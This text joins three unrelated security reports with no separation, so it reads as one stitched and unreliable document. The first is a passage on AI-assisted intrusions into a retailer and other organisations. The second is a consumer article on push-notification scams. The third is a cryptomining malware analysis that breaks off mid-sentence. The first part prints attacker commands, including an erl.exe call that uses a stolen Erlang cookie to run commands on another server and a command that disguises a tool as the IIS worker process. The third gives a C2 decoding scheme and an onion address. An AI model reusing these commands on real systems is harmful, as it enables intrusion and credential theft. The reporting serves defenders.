The attackers then turned to the server's monitoring software. They located the SolarWinds Orion installation, queried its local SQL Server instance for the table of monitored nodes, and read the Zabbix agent's pre-shared key. Using SQL logins and passwords that they already held, they connected to two remote SQL Servers and tested whether each login had the sysadmin role.

The next step was lateral movement. The attackers identified the RabbitMQ message broker that ships with Orion and read its Erlang cookie file (.erlang.cookie): the shared secret that Erlang nodes use to authenticate to one another. They ran the erl.exe that Orion bundles, with the cookie, to call the RabbitMQ node on a second web server and run an operating system command. About 10 minutes had passed since they first queried the Orion service. The command was encoded as a list of decimal character codes, which does not appear in plain text in the command line:

"CSIDL_PROGRAM_FILESX86\solarwinds\orion\erlang\erts-9.0\bin\erl.exe" -noshell -sname <random> -setcookie [REMOVED] -eval "io:put_chars(rpc:call('rabbit@<web server 2>',os,cmd,[[119,104,111,97,109,105]])),halt()."

The first command decodes to whoami. Subsequent calls decode to registry queries against the SAM database, the SECURITY hive's cached-logon and LSA secrets locations, and the built-in Administrator account, which together hold password hashes, cached domain credentials and LSA secrets.

Several of the scripts that followed opened with comments that stated a hypothesis, cited earlier results and revised a previous conclusion. This is unusual in commands and suggests that the reasoning of the tool generating them was being passed through with the code. The comments also refer to a SOCKS channel that the attackers were already using to reach the internal network; the telemetry does not show it being set up.

# Re-measure <host A> from <host B>, which shares the /27 with it.# Every previous negative result about <host A> came from our SOCKS channel, and that# channel is known to fabricate success on <host A> (445/139) - and to 401 even with# valid SSPI. So the "FTP anonymous off, 9 reused passwords failed" verdict has# to be re-taken from a vantage point that actually routes to the host.

Later that same day, the attackers fetched a second build of the process-tree-breaking utility, BreakChainCs.exe, and used its shell and WMI modes to launch bdreinit.exe and the ask.exe kit so that they no longer appeared as children of w3wp.exe. They also copied ask.exe to a file named w3wp.exe in ProgramData, matching the name of the IIS worker process.

CSIDL_COMMON_APPDATA\breakchaincs.exe -m wmi "CSIDL_COMMON_APPDATA\bdreinit.exe"cmd /c copy CSIDL_COMMON_APPDATA\ask.exe CSIDL_COMMON_APPDATA\w3wp.exe

On September 24, a fifth computer (Computer 5), another SQL Server host, saved its SAM and SECURITY hives to a new folder under ProgramData. Activity resumed on a larger scale on September 25. On Computer 4, the security product detected a Chisel tunnelling tool, and the attackers ran a PowerShell download cradle to fetch a script, sqlrun2.ps1, from a new staging server at 108.165.20[.]205 on port 8080.

Computer 2 was active again the same day, and its commands suggest that it is a domain controller. The attackers saved the registry hives again, searched the system drive for NTDS.dit, the Active Directory database that stores the password hashes for every domain account, and searched SYSVOL for Group Policy Preferences cpassword values and Active Directory for LAPS (Local Administrator Password Solution) passwords. They also tried a short list of candidate passwords for the sa account against several SQL Servers, and xp_cmdshell commands then ran against one of them, which indicates that one login succeeded.

A sixth computer (Computer 6) joined the activity that afternoon, and the attackers scanned more than a dozen internal hosts for SQL Server, SMB, RDP and WinRM ports. On September 26 a seventh computer (Computer 7), running an older version of SQL Server, ran a password sprayer. It downloaded a list of credential pairs from the new staging server and tested each pair against a web service. Several file names in this incident begin with i followed by a number, such as i187_winspray.ps1, which may be a per-target numbering scheme in the attackers' tooling. Use of the sprayer on this computer continued until at least September 29.

Significance

The most important finding in this investigation is not a new technique. Erlang remote procedure calls, cookie theft and credential harvesting from configuration files are all long documented. What AI assistance appears to have changed is the speed and reliability with which the attackers applied them. Within about 10 minutes of discovering what software ran on the web server, the operators had identified an unfamiliar message broker, located its shared secret and used it to run commands on another host. The day before, the same operators with the same access had achieved little.

The tooling suggests that AI was added to an existing toolkit rather than being its source. The same side-loading components and staging server appeared in an earlier intrusion in which Symantec found no signs of AI assistance. A separate report published on September 22, 2026 by Gambit Security described a financially motivated operator who ran open-source AI tools against online retailers, whose AI console loaded a Chinese-language persona titled “SOUL - Red Team Operator,” and listed 155.254.22[.]215 as its staging and command server and AI console. That is the address the attackers tested from the victim's servers on September 18, 2026. Taken together, the shared address, the focus on retailers, and the search for point-of-sale credentials suggest that the two operations may be linked, although the Gambit report does not mention the loaders described here. It does describe an instruction to wipe card data after extraction, but we saw no destructive activity in this intrusion.

Other AI-assisted attacks

This attack was one of dozens of AI-assisted attacks Threat Hunter has investigated in recent months. Several further cases remain under investigation.

The pace of these attacks increased as the quarter went on, with the majority of attacks occurring in September. Brief outlines of some of these attacks are below.

University web server in Vietnam

In June 2026, attackers deployed a web shell on a university web server in Vietnam and altered the site's configuration so that a malicious component would load with it. They also overwrote some of its core files and changed file dates to cover their tracks. They next made six failed attempts to download PrintSpoofer, a public tool that gives attackers full control of a Windows machine. When direct downloads failed, they smuggled the tool in as text and rebuilt it on the server.

The aim of the attack seems to have been to take full control of the server and keep that access. Attacker commands ran about a second apart, and the first sessions were separated by almost exactly three and 12 hours, which points to automation. One of the clearest signs of AI usage was a script that contained numbered notes in Chinese addressed to the operator, including a suggestion to focus on a particular directory because of a username found earlier. That read like a chat assistant's reply pasted straight into the attack.

ICT provider in East Africa

In late August 2026, attackers spent about 61 hours inside the network of a technology provider that serves banks and telecoms in East Africa. They ran commands through both a web shell and the company's database service, set up tunnels to route their traffic, prepared a dump of stored login credentials in a web folder and used a built-in Windows tool to copy the Active Directory database, which holds password hashes for every account. They also searched files for mobile-money terms, such as M-Pesa, and for payment keys and callback addresses. This suggests they were after the credentials that connect the company's systems to mobile payment services.

For one period, the nature of the attacker commands changed in the same way as described above in our account of the attack on the U.S. retail organization. The attackers submitted 212 long scripts, averaging about 1,000 characters, with explanatory comments, tidy labelled output and no typing errors. One script built a list of likely passwords from the names of the company's applications, which it had found earlier, and another built a low-level network query by hand that worked the first time. In the later hands-on phases, five commands in a row failed with simple mistakes. The AI added no new technique, but it let the attackers apply known ones quickly and accurately.

Government hydroelectric company in a south Asian country

In August 2026, attackers deployed a PHP web shell on a Windows server belonging to a hydroelectric power company in a south Asian country. After some hand-typed reconnaissance on August 13, they switched to PowerShell scripts that tried four sets of credentials against several databases, pulled rows from tables that held passwords, checked whether the account had administrator rights (using obfuscated queries) and whether it could run commands through the database, and then tried to run a command on a second server.

The goal appears to have been to harvest passwords and move laterally to other systems. The scripts had section headings, neat error reports and trimmed output, which is typical of AI-written code. One still contained the placeholder YOUR_IP where an attacker's server address should have been, which suggests the generated script was pasted in without being edited.

Web hosting server in a south Asian country

In July 2026, attackers used a web shell on a shared web hosting server in a south Asian country. They worked in four bursts about three hours apart, running roughly 970 commands about one second apart with no typing errors, which points to automated or AI-driven activity.

They took database passwords from the sites' configuration files, logged in to a remote database server that held about 20 databases, including tables of cryptocurrency wallets, money transfers and payouts, and created scheduled tasks with names designed to look like system health checks. They also tried to take full control of the server using a public exploit for a 2022 Windows vulnerability (CVE-2022-21882).

When security software blocked the download, they retried in five different ways within about 90 seconds. The wallet and payout tables suggest that the attackers were financially motivated.

Linked cases in south Asia

Three more attacks, at organizations that appear to be in south Asia, shared tools, infrastructure or both. At the first organization, on September 20, 2026, attackers spent about two hours on a compromised web server testing which methods would let them download and run code and marked each success with a short word such as PSOK or MSHTAOK. They then downloaded a malicious program disguised as a Windows system file (svchost.exe) from a web domain. Over four days of sessions, from September 18 to 22, they also shut down security software, raised their privileges and set up daily persistence.

An attack on a second organization used a staging server and download domain that were also used in the first attack. Two web servers were compromised, with marker words such as WEBSHELL_OK, showing which steps had worked. On one machine the attackers ran 290 commands in 28 minutes, with 44 percent of the gaps between them a second or less. When a privilege escalation tool was blocked, they rebuilt it on the machine within about 10 minutes. They installed a custom backdoor program as a Windows service on one server and hid another inside an application folder on the other. The aim in both cases appears to have been lasting, high-level control of the servers, but the motive is unclear.

At the third organization, the earliest activity, on September 2, came through the SQL Server database service. The attackers set up scheduled tasks to keep their access, copied the system's stored password data, and created a hidden tunnel using a Tailscale-like tool that they renamed after security software blocked it. They then sprayed passwords against an external database server and stole a spreadsheet whose name suggests it held application security details, by encoding it and printing it out in chunks.

The commands ran about a second apart in sessions roughly three hours apart, with labelled sections and numbered scripts, and the access was still active in early October. The motive for these attacks is unclear.

Common trends

Many cases followed a similar sequence: command execution through a web shell or SQL Server, a privilege escalation tool from the Potato family such as PrintSpoofer, GodPotato or EfsPotato, registry hive dumps and, in some, a tunnelling tool such as Chisel. In all cases, AI supplied no new techniques or tactics, only a new way of meeting objectives.

AI increased the speed and persistence of the attacks. After a block, attackers renamed or rebuilt their tools within seconds or minutes. One rebuilt an exploit in about 10 minutes, another swapped tool and file names within about 10 seconds of a block, and in the retail attack the second build of the process-tree-breaking tool arrived about 75 minutes after the first was blocked.

The degree of human involvement varied. In the retail attack, the gap between scripts never fell below seven seconds, which suggested an operator relaying output between an AI tool and the web shell. Several other attacks showed median gaps of about one second and sessions that recurred about every three hours, which look more like automation. In most cases, the evidence could not show whether an operator was in the loop.

Protection

For the latest protection updates, please visit the Symantec Protection Bulletin.

If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file.

Indicators of Compromise

File indicators

54fb493822bcd832f7b2256015f13e3dfde815e1931e7fd39a90ea8ad3fdbd0a – server.ps1 (AES–encrypted PowerShell reverse shell)

a6579b16f895cf9ac4c31ba20606f2ad1ac4d1458e95c296da2afc1039881513 – bdreinit.exe (Legitimate Bitdefender executable used for side–loading)

9c866c403e6bd5778fa3788cac9aac39aab1bf2d18a22c9999a4c27e30c0abf3 – log.dll (Malicious DLL)

e95a265bf220a4330f77f842b3eeed8b1ed8c61f51d7e3f2fd33bac14b6b26af – log.dll (Malicious DLL)

c21e4fb40f871e418def63a5cdf3603ed4c3c6d1b218710db8ba45538b66fa01 – Malicious DLL

A website asks you to click “Allow” to start a quiz or read an interesting story. A little later, your device starts warning you about viruses, missed payments, or legal trouble.

While every message may look like a new security problem, the cause could be a permission you granted earlier.

For scammers, browser push notifications turn a passing visit into something much more valuable: access to your attention after you have left their website.

Two investigations—including our own research into deceptive quiz sites and HUMAN Security’s investigation of an operation called Pushpaganda—show how that permission can become a tool for repeated advertising, scareware, and fraud.

Ordinarily, a deceptive website has a limited opportunity to influence you. Once you leave, its sales pitch disappears.

A simple browser push notification permission changes that relationship. A website you’ve authorized can send browser notifications even when you’re not visiting it. Depending on the platform and browser configuration, those messages can appear even when the browser is not visibly open.

Just what scammers need

That gives scammers several advantages:

Repeat opportunities to get a click. Instead of relying on one visit, they can send more messages to bring you back to their sites.

A more convincing place to display a lie. Notifications appear through the browser and operating system, while their wording and imagery can impersonate security alerts, financial messages, or people you know.

Distance from the original trick. By the time alarming messages start appearing, you may not remember which website received permission, let alone connect the alerts to an innocent-looking quiz.

More chances to make money. The resulting traffic can feed advertising, affiliate promotions, scams, and unwanted downloads.

Allowing notifications doesn’t install malware. But scammers can use them to trick you into clicking a harmful link or downloading something dangerous. That explains why your device can display frightening warnings while a malware scan finds nothing wrong.

The campaigns

The quiz that came with an unwanted extra

Our investigation, published on March 9, began with customers who thought their devices were infected. Malwarebytes scans came up clean. Screenshots helped our Malware Removal Support team identify the real source of the trouble: web push notifications.

While the quizzes were real, the trick was making people think they had to allow the notifications to take them.

Clicking “Start the quiz” first brought up the browser’s notification permission request. Behind that legitimate browser prompt, the website displayed its own instruction:

“Click ‘Allow’ to continue.”

The page made it seem you had to allow the notifications to take the quiz, when it actually meant agreeing to receive future messages.

From clickbait to a notification loop

On April 14, HUMAN Security’s Satori researchers published a larger example of the same underlying strategy. They called it Pushpaganda.

Instead of quizzes, the operation used sensational articles and images, many showing signs of AI generation. Headlines promised attention-grabbing financial developments or implausible technology bargains. The content appeared in Google Discover feeds, exposing it to Android and Chrome users. Researchers could not establish whether those placements resulted from paid promotion or search optimization.

Once someone visited an associated website, the operation prompted them to enable notifications. The messages that followed had little to do with the article that attracted the visitor. Researchers observed fake arrest warrants, false financial alerts, and notifications mimicking missed calls from “Mom” or other family members.

Scam or legit? Scam Guard knows.

TRY IT NOW

Scam Guard stats

The graph shows weekly counts of reports classified by Scam Guard as matching quiz-site notification abuse (red) and Pushpaganda (blue), based on the information provided by users.

The counts show reports over time linked to these campaigns. They don’t represent unique victims, confirmed infections, or total campaign activity.

For context: HUMAN Security’s Satori researchers observed roughly 240 million advertising bid requests associated with Pushpaganda domains in a single seven-day period at the operation’s peak.

A bid request asks advertisers in real-time to bid for an opportunity to show an ad. In a push notification ad auction, the winning ad is sent as a notification to someone who has allowed them.

Note the dip after the reports came out. It takes time to rebuild the infrastructure, but criminals will do so if they think it’s worth the investment.

How to stay safe

Allow notifications only when you want ongoing messages from a site. A few guidelines that may help you:

Don’t click on prompts until you’re sure what they will set in motion.

Treat “Allow notifications to continue” as a red flag, particularly on quizzes, video pages, or unfamiliar websites.

Use web protection. Malwarebytes Browser Guard is a free tool that can help block malicious websites.

If you’re haunted by unwanted alerts, they might be web push notifications. Here’s how to identify the website sending them and turn them off in several popular browsers.

On supported Android devices, Chrome notifications include an Unsubscribe option. Use that built-in control rather than a link inside a suspicious message. When you receive an unwanted website notification through Chrome on Android:

Swipe down from the top of the screen to open Android’s notification shade.

Look for an Unsubscribe action on the notification.

If it is present, tap it to stop future notifications from that website. Chrome also provides Undo if you unsubscribe accidentally.

If Unsubscribe is not present, open Chrome and go to More > Settings > Site settings > Notifications. Review the allowed websites and block the offending site. You don’t need to follow a link in the suspicious notification to manage its permission.

Elastic Security Labs is tracking REF3364, a Linux cryptomining intrusion that combines custom malware with publicly available miners. The toolkit includes SANSAR, a Rust orchestrator that receives commands over Tor (The Onion Router) used to manage CPU and GPU miners.

The threat actor also deployed a kernel rootkit to hide selected processes and files, an NVIDIA Management Library (NVML) wrapper to falsify GPU readings, and a separate backdoor named netns. This backdoor retrieves its C2 address from an Ethereum smart contract before connecting to the server directly.

The use of public blockchains to locate C2 infrastructure is a pattern we also discussed in our 2026 Threat Command quarterly report.

Key takeaways

The actor abused an exposed Ray job agent, obtaining root and deploying the toolkit across three Linux GPU hosts.

SANSAR uses Tor for C2 and supervises CPU and GPU miners.

SANSAR’s command handlers support miner configuration and interactive shells.

The NVIDIA Management Library (NVML) wrapper falsifies GPU readings, while the kernel rootkit hides selected processes, files and socket entries.

Initial access: an exposed Ray job agent

The attacker compromised the first host through an exposed Ray job agent. Ray is an open-source framework for distributing Python workloads, including AI model training and inference, across multiple machines. Its Jobs API lets users submit commands to run applications on the cluster.

On that host, the dashboard on Ray's head node listened only on the local loopback interface. The job agent remained reachable from the internet and accepted job submissions without authentication. The attacker used this interface to execute commands through Ray.

Between October 22 and 25, 2026, the recorded activity progressed from external probing to persistent access:

October 22, 2026: external probes first appeared in the Ray logs.

October 24, 2026: a submitted job ran the NVIDIA System Management Interface (nvidia-smi) and sent the GPU inventory to an external server.

October 25, 2026: the actor submitted a Python reverse-shell job that connected to an external listener.

The reverse shell ran under the local account that owned the Ray session. The actor subsequently added an SSH key to that account’s authorized_keys file to establish persistent access.

Inside the SANSAR Linux cryptomining toolkit

Toolkit deployment

After obtaining root, the actor staged the toolkit under /opt/vadi_, built the acpi_thermal_mgr kernel module through Dynamic Kernel Module Support (DKMS) and added an initramfs loader. An initramfs is a temporary root filesystem loaded into RAM during early boot, before Linux switches to its normal root filesystem. The module and loader are stored in the boot image on disk, so the rootkit can load again when the host boots with that image.

The installation also replaced the NVML library and registered the separate netns backdoor as a systemd service.

The GPU miner arrived later on two hosts. A kernel log records /opt/vadi_/tilki starting on one machine; cache creation and new GPU contexts support execution on the other system.

The following is a table identifying the files deployed on the machines:

File

sansar

The collected tilki has the same SHA-256 hash as the executable in the official SRBMiner-MULTI 3.6.9 Linux release.

The diagram below shows the toolkit’s components, SANSAR’s Tor control channel and the separate netns backdoor’s use of Ethereum to retrieve its C2 address:

SANSAR analysis: anti-debugging and the encoded onion C2 domain

The name SANSAR comes from its filename and the sansar-client v0.1.3 version string.

Before setting up the connection, SANSAR performs an anti-debugging check by reading /proc/self/status and exits if TracerPid is nonzero. It also records the time for a 1,000-iteration loop and exits if it takes 501 milliseconds or longer.

The controller hostname is stored as 62 encoded bytes. We reproduced the decoder offline: each byte is rotated right by (i % 7) + 1, then XORed with a byte from a repeating 32-byte mask.

plaintext[i] = ROR8(ciphertext[i], (i % 7) + 1) XOR mask[i % 32]

Which results to the following domain with a hardcoded port value of 9051:

efxisnqldelyr5ra25oqfrsut54b34g26e7zrsiuupsoekjof2gho2id.onion:9051

SANSAR uses this onion service for C2 communication, receiving commands, reporting host inventory and obtaining the miner’s status.

Tor client initialization

SANSAR uses Arti, the Tor Project's Rust implementation of Tor, as a library for its C2 connection. It resolves its supporting paths relative to the executable directory. These include:

arti_data/state

arti_data/cache

bridges

.client_id

lyrebird

The bridges file lists alternative entry points into Tor. Bridges are relays whose addresses are not listed in the public relay directory and can help clients reach Tor when direct connections are blocked. The collected file contains seven WebTunnel entries and three obfs4 entries.

Sansar supports two Tor connection modes. Direct mode connects through Arti without Lyrebird. Bridge mode uses Lyrebird to reach Tor through the configured WebTunnel or obfs4 bridges. Both modes connect to the same onion C2. Their initial bootstrap deadlines are 60 and 900 seconds, respectively.

Host and GPU enumeration

SANSAR collects GPU information with the following command:

nvidia-smi --query-gpu=name --format=csv,noheader

SANSAR uses the startup result to decide whether a GPU miner can be launched. It repeats the query during registration and sends both GPU inventories to the C2, together with the logical CPU count.

To establish the host’s public IP, SANSAR queries four external services in order, with a five-second deadline per attempt, stopping at the first valid response:

api.ipify.org

ifconfig.me/ip

icanhazip.com

checkip.amazonaws.com

Registration, HMAC authentication and heartbeats

SANSAR sends a 40-byte authentication field during registration: a timestamp followed by an HMAC-SHA256 digest. It calculates the digest from the client ID followed by the timestamp, using a key embedded in the binary. Host inventory is not included in the calculation.

timestamp = BE64(unix_seconds) authentication = timestamp || HMAC-SHA256(K, client_id_bytes || timestamp)

Heartbeats report how long SANSAR has been running, its Tor connection mode (direct or bridge) and the number of successful reconnects. They can also report how many bridges were tested, how many were healthy and when the last test ran.

SANSAR’s binary C2 message protocol over Tor

SANSAR exchanges binary messages over its Tor connection. Each frame starts with a four-byte big-endian body length, followed by a four-byte little-endian message type and the payload for that type. The length covers the type and payload, excluding the length field itself.

typedef struct { uint8_t body_length[4]; uint8_t message_type_id[4]; uint8_t payload[]; } sansar_c2_comm_frame;

An illustrative ShellData frame carrying whoami followed by a newline would contain:

General command handlers

ReportVersion returns sansar-client v0.1.3. The Restart handler replies with success and Restart initiated, then returns to message processing without restarting SANSAR. Custom returns an unknown-command error without executing the supplied command or arguments.

Interactive shells in a pseudo-terminal

ShellOpen starts /bin/bash --norc --noprofile in a pseudo-terminal. It sets HISTFILE=/dev/null and zeroes the history-size variables to suppress saved shell history. A session ID links subsequent input, resize and close requests to the correct terminal. SANSAR forwards the terminal's output to the C2.

CPU and GPU miner management

The C2 sends a MinerStart message to SANSAR with the settings for a mining job: the pool address, wallet or pool login, optional algorithm, extra command-line arguments and proxy flag. SANSAR saves this configuration and uses it to build the miner's command line. Its launch paths provide no hardcoded fallback for the pool or wallet/login.

The message also includes a miner ID, which identifies the managed miner in later update, stop and output requests. A separate miner_type field selects the executable:
